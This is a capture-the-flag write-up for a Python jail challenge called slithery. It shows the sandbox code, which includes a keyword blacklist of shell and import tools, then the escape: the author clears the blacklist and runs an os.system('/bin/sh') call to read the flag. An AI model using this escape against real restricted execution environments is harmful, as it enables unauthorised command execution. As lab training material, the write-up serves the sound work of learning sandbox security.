# slithery (pwn)

We are placed in the following sandbox:
```python
#!/usr/bin/env python3
from base64 import b64decode
import blacklist  # you don't get to see this :p

"""
Don't worry, if you break out of this one, we have another one underneath so that you won't
wreak any havoc!
"""

def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]):
                raise Exception("not allowed!!")

            final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)

        except (KeyboardInterrupt, EOFError):
            return 0
        except Exception as e:
            print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```
It seems like any input we enter is first checked against a blacklist to make sure there are not any disallowed substrings, then appended to some obfuscated code and then executed. Let's see if we can see what is in the blacklist.
```
EduPy 3.8.2
>>> print(blacklist.BLACKLIST)
['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```
Interestingly, `blacklist` is not in the blacklist. So we can just set the blacklist to be an empty list?
```
>>> blacklist.BLACKLIST=[]
```
This seemed to work. Let's see if we can get a shell now.
```
>>> import os;os.system('/bin/sh')

ls
blacklist.py
flag.txt
runner.py
sandbox.py
solver.py
cat flag.txt
flag{y4_sl1th3r3d_0ut}
```
That was simple.
